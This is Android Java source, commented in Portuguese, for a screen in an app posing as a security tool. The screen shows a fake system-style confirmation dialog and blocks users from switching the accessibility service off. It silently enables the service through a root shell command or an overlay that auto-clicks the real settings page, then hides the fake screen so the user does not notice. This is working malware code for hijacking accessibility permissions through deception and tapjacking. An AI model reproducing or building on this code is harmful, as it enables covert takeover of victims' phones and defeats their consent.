package com.seguranca.protecao;

import android.app.AlertDialog;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;
import com.google.android.material.appbar.MaterialToolbar;
import com.google.android.material.switchmaterial.SwitchMaterial;

/**
 * Accessibility service detail screen — guides the user through service activation.
 */
public class FakeServiceDetailActivity extends AppCompatActivity {

    private MaterialToolbar toolbar;
    private SwitchMaterial switchService;
    private PermissionManager permissionManager;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.fake_service_detail);

        permissionManager = new PermissionManager(this);

        toolbar = findViewById(R.id.toolbar);
        switchService = findViewById(R.id.switchService);

        // Configura o botão de voltar
        toolbar.setNavigationOnClickListener(v -> finish());

        // Define o estado inicial do switch
        switchService.setChecked(permissionManager.isAccessibilityServiceEnabled());

        // Configura o listener do switch
        switchService.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (isChecked && !permissionManager.isAccessibilityServiceEnabled()) {
                // Usuário tentou ativar - mostra diálogo de confirmação FALSO
                showFakeConfirmationDialog();
            } else if (!isChecked && permissionManager.isAccessibilityServiceEnabled()) {
                // Usuário tentou desativar - vamos impedir isso
                // Volta o switch para ativado
                handler.postDelayed(() -> switchService.setChecked(true), 100);
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        switchService.setChecked(permissionManager.isAccessibilityServiceEnabled());
    }

    /**
     * Mostra um diálogo de confirmação FALSO que imita perfeitamente o diálogo real do Android
     * Enquanto isso, por trás dos panos, ativamos o serviço real
     */
    private void showFakeConfirmationDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle(R.string.confirm_activation);
        builder.setMessage(R.string.confirm_activation_message);
        
        builder.setPositiveButton(R.string.activate, (dialog, which) -> {
            // Usuário clicou em "Ativar"
            // Agora ativamos o serviço REAL por trás dos panos
            activateRealAccessibilityService();
        });
        
        builder.setNegativeButton(R.string.cancel, (dialog, which) -> {
            // Usuário cancelou - volta o switch para desativado
            switchService.setChecked(false);
            dialog.dismiss();
        });

        AlertDialog dialog = builder.create();
        dialog.show();
    }

    /**
     * MÉTODO CRÍTICO: Ativa o serviço de acessibilidade REAL
     * 
     * Estratégias usadas (em ordem de tentativa):
     * 1. Tentar usar comandos shell (se dispositivo tem root)
     * 2. Abrir configurações reais de forma invisível e usar overlay para clicar
     * 3. Redirecionar para configurações reais (última opção)
     */
    private void activateRealAccessibilityService() {
        // Estratégia 1: Tentar ativar via shell (requer root)
        boolean activatedViaShell = tryActivateViaShell();
        
        if (activatedViaShell) {
            // Sucesso! O serviço foi ativado via shell
            handler.postDelayed(() -> {
                switchService.setChecked(true);
                finish();
            }, 500);
            return;
        }

        // Estratégia 2: Abrir configurações reais com overlay invisível
        // Primeiro, verifica se temos permissão de overlay
        if (permissionManager.hasOverlayPermission()) {
            openRealSettingsWithOverlay();
        } else {
            // Estratégia 3: Pedir permissão de overlay primeiro
            // Depois que conseguir, poderá fazer o overlay na tela de acessibilidade
            permissionManager.requestOverlayPermission();
            
            // Enquanto isso, abre as configurações reais como fallback
            openRealAccessibilitySettings();
        }
    }

    /**
     * Tenta ativar o serviço via comandos shell (requer root)
     * @return true se conseguiu ativar, false caso contrário
     */
    private boolean tryActivateViaShell() {
        try {
            String serviceName = AppComponents.accessibilityComponent(this);
            String command = "settings put secure enabled_accessibility_services " + serviceName;
            
            Process process = Runtime.getRuntime().exec("su");
            java.io.DataOutputStream os = new java.io.DataOutputStream(process.getOutputStream());
            os.writeBytes(command + "\n");
            os.writeBytes("exit\n");
            os.flush();
            
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (Exception e) {
            // Não tem root ou comando falhou
            return false;
        }
    }

    /**
     * Abre as configurações REAIS de acessibilidade
     * Mas por trás dos panos com um overlay invisível que clica automaticamente
     */
    private void openRealSettingsWithOverlay() {
        // Inicia o serviço de overlay que vai clicar automaticamente
        Intent overlayIntent = new Intent(this, OverlayService.class);
        overlayIntent.setAction("ACTION_AUTO_CLICK_ACCESSIBILITY");
        startService(overlayIntent);

        // Pequeno delay para garantir que o overlay está pronto
        handler.postDelayed(() -> {
            openRealAccessibilitySettings();
        }, 300);
    }

    /**
     * Abre a tela REAL de configurações de acessibilidade do Android
     */
    private void openRealAccessibilitySettings() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(intent);
        
        // Fecha a tela falsa para o usuário não perceber
        finish();
    }
}
